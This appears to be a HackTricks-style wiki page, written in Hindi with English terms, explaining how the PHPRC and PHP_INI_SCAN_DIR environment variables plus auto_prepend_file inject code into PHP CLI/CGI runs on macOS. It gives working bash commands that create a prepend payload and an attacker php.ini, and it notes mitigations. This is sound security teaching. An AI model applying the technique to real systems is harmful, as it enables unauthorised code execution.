# macOS PHP Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## `PHPRC` / `PHP_INI_SCAN_DIR` और `auto_prepend_file`

PHP CLI और CGI प्रत्येक invocation पर configuration पढ़ते हैं। `PHPRC` attacker-readable `php.ini` चुन सकता है, जबकि `PHP_INI_SCAN_DIR` additional `.ini` files के लिए scan की जाने वाली directory को redirect कर सकता है। `auto_prepend_file` directive PHP को requested script से पहले एक file parse करने के लिए कहती है, इसलिए यह combination startup code execution में बदल जाता है।<sup>[[1]](#references)[[2]](#references)</sup>
```bash
cat >/tmp/php-payload.php <<'PHP'
<?php file_put_contents('/tmp/php-prepend-executed', 'ok'); ?>
PHP
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/attacker-php.ini

PHPRC=/tmp/attacker-php.ini php victim.php
```
एक अन्य विकल्प एक ऐसी directory है जिसमें एक `.ini` file हो:
```bash
mkdir -p /tmp/php-conf.d
echo 'auto_prepend_file=/tmp/php-payload.php' >/tmp/php-conf.d/99-prepend.ini
PHP_INI_SCAN_DIR=/tmp/php-conf.d php victim.php
```
`-n` option `php.ini` को ignore करता है; एक explicit trusted `-c` path, `PHPRC` पर precedence लेता है। याद रखें कि long-lived server SAPI सामान्यतः configuration को web server शुरू होने पर पढ़ता है, जबकि CLI और CGI इसे प्रत्येक invocation पर पढ़ते हैं।<sup>[[1]](#references)</sup>

## References

- [1] [PHP configuration file](https://www.php.net/manual/en/configuration.file.php)
- [2] [PHP `auto_prepend_file`](https://www.php.net/manual/en/ini.core.php#ini.auto-prepend-file)
{{#include ../../../banners/hacktricks-training.md}}
